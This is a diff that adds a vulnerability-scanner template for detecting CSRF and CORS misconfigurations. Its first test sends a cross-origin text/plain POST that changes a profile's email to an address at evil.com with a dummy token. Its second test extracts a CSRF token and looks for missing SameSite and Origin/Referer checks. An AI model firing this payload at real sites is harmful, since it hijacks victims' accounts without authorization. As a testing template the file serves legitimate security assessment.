@@ -1,0 +1,48 @@
+id: CSRF-ADV-01
+name: Advanced CSRF Misconfiguration (CORS Chain + Token Reuse)
+severity: high
+category: authentication
+metadata:
+  cwe: CWE-352, CWE-346
+  tags: ["csrf", "cors", "bypass", "token-reuse"]
+
+requests:
+  # Test 1: JSON CSRF (Bypass CORS preflight)
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/update-profile"
+    headers:
+      Content-Type: "text/plain"
+    body: '{"email":"attacker@evil.com", "csrf_token":"dummy"}'
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "updated"
+          - "success"
+
+  # Test 2: Check if token is session-bound vs static (Take token from guest, use it as admin)
+  - method: GET
+    path:
+      - "{{BaseURL}}/profile"
+    extractors:
+      - type: regex
+        name: csrf_token
+        regex:
+          - 'csrf_token" value="([a-zA-Z0-9]+)"'
+    matchers-condition: and
+    matchers:
+      - type: word
+        negative: true
+        words:
+          - "SameSite=Strict"
+          - "SameSite=Lax"
+        part: body
+      - type: word
+        words:
+          - "Origin: {{BaseURL}}"
+          - "Referer: {{BaseURL}}"
+        negative: true
+        part: header
